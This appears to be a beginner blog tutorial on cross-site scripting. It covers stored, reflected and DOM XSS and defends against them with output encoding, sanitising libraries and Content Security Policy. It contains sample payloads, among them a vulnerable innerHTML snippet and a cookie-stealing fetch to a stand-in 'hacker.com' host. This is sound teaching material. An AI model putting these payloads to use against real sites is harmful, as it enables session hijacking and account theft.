# Web Security 101: Part 3 - Cross-Site Scripting (XSS): When Input Becomes Code

> **Author**: Nithish
> **Published**: Jan 23, 2026

---

![Nithish](https://miro.medium.com/v2/da:true/resize:fill:32:32/0*0bNllPdGus6HHhqL)

1

Listen

Share

![image](https://miro.medium.com/v2/resize:fit:700/1*QZe4w4Pi8mlim4BKo9tzLQ.png)

## The Pain Point: The Context Confusion

You built a comment section. A user posts “Hello!”. It appears on the screen. Another user posts <script>...code...</script>. Suddenly, your website starts behaving strangely for everyone who views it.

Why does this happen? Browsers are incredibly obedient but somewhat naive. They read a web page from top to bottom. They cannot inherently tell the difference between:

- Code provided by the developer (You).
- Data provided by the user (The Input).

When the browser sees a < character followed by a tag name like script or img, it switches "context" from displaying text to executing instructions. XSS is simply the art of tricking the browser into making this switch when it shouldn't.

## 1. The Three Types of XSS

To defend against XSS, you must identify how the malicious payload travels from the attacker to the victim.

### A. Stored XSS

This is the most dangerous form because it is persistent.

- The Mechanism: The attacker plants the malicious script in your database (e.g., in a comment, a user profile bio, or a forum post).
- The Trap: Later, when any victim (or hundreds of victims) loads the page, your server pulls that “comment” from the database and serves it to the victim’s browser.
- The Result: The attack executes automatically just by viewing the page. No clicking required.

### B. Reflected XSS

This relies on social engineering. The payload is not in the database; it is in the link itself.

- The Mechanism: Many sites “reflect” input back to the user.
- You search for “apple”.
- The site says: “Results for apple”.
- The Attack: An attacker crafts a URL where the search term is a script: example.com/search?q=<script>stealCookies()</script>
- The Trap: The attacker sends this link via email or chat (“Hey, check out this product!”). When the victim clicks it, the request goes to your server. Your server unknowingly grabs the q parameter and renders it into the HTML: <h1>Results for <script>...</h1>.
- The Result: The script executes immediately in the victim’s browser.

### C. DOM XSS

This is the trickiest one because the server isn’t involved at all. The vulnerability exists entirely in your JavaScript code running on the client.

## Get Nithish’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Key Concepts:

- Source: Where the data comes from (e.g., location.hash, location.search, document.cookie).
- Sink: Where the data is placed (e.g., .innerHTML, document.write).
- The Vulnerability: If you take data from a Source and put it into a Sink without cleaning it, the code executes.

Vulnerable Example:

```
// Source: The attacker controls the URL fragment (#)
const userTag = window.location.hash.slice(1); 

// Sink: innerHTML interprets strings as HTML code
// If URL is website.com#<img src=x onerror=alert(1)>
document.getElementById('profile').innerHTML = userTag;
```

## 2. What’s the Worst That Can Happen?

Developers often think, “So what if an alert box pops up?” But XSS gives an attacker full control over the user’s interaction with the application.

- Session Hijacking (The “Keys to the Castle”): Websites use cookies to remember you are logged in. JavaScript can read these via document.cookie.
- Attack Payload: <script>fetch('https://hacker.com/steal?cookie=' + document.cookie)</script>
- Result: The attacker gets your session ID and logs into your account without a password.
- Trojan Actions: The script can force the user’s browser to perform actions silently.
- Example: On a banking site, an XSS script can trigger a POST request to /transfer-money in the background. The user sees nothing, but their money is gone.
- Keylogging & Phishing: An attacker can inject a fake login form (“Session expired, please login again”) directly over your real page. When the user types their password, it is sent to the attacker.

## 3. Mitigation: Defense in Depth

You cannot “filter” your way out of XSS easily (blacklists almost always fail). You must use Encoding and Boundaries.

### A. Context-Aware Encoding (The Primary Defense)

Encoding means converting special characters into their safe HTML entity equivalents. This tells the browser: “Display this character, do not interpret it.”

- < becomes &lt;
- > becomes &gt;
- " becomes &quot;

The Difference:

- Raw Input: <script>alert(1)</script> -> Browser: "Run this script!"
- Encoded Input: &lt;script&gt;alert(1)&lt;/script&gt; -> Browser: "Print the text '<script>alert(1)</script>' on the screen."

In Modern Frameworks: React, Vue, and Angular do this automatically for you.

```
// React automatically encodes 'userInput'
// If userInput is "<script>...", React renders "&lt;script&gt;..."
<div>{userInput}</div>
```

The Danger Zone: Every framework has an “escape hatch” where you tell it to stop protecting you. Use these only if absolutely necessary and after sanitizing the data using a library like DOMPurify.

- React: dangerouslySetInnerHTML
- Vue: v-html
- Angular: [innerHTML]

### B. Content Security Policy (CSP) (The Safety Net)

Even with perfect coding, humans make mistakes. CSP is a browser feature that acts as a backup plan. It is an HTTP header returned by your server.

Example Header: Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-analytics.com

What it says: “Hey Browser, for this page, ONLY load JavaScript files hosted on my own domain ('self') or Google Analytics. If you see an inline script like <script>... or a script from hacker.com, block it immediately."

This neutralizes most XSS attacks because the attacker’s injected script is forbidden from running by the policy.

## The Mystery Solved: The Broken Page

Remember the comment section that broke the whole page? That happened because you took data from the database and fed it directly to the browser using a dangerous method (like .innerHTML or PHP echo without escaping). The browser saw the special characters < and > and confused data (the user's comment) with instructions (HTML structure).

How this knowledge saves you: If you understood Context-Aware Encoding, you would have known that data must be “neutralized” before display. Instead of rendering <script>, your code would have converted it to &lt;script&gt;. The browser would then display the text of the script to the user, but it would never execute it. The page stays broken for no one, and the attacker's code becomes harmless text.



---
*Original URL: [https://medium.com/system-weakness/web-security-101-part-3-cross-site-scripting-xss-when-input-becomes-code-8d4471fef6ad?source=search_post---------92-----------------------------------](https://medium.com/system-weakness/web-security-101-part-3-cross-site-scripting-xss-when-input-becomes-code-8d4471fef6ad?source=search_post---------92-----------------------------------)*
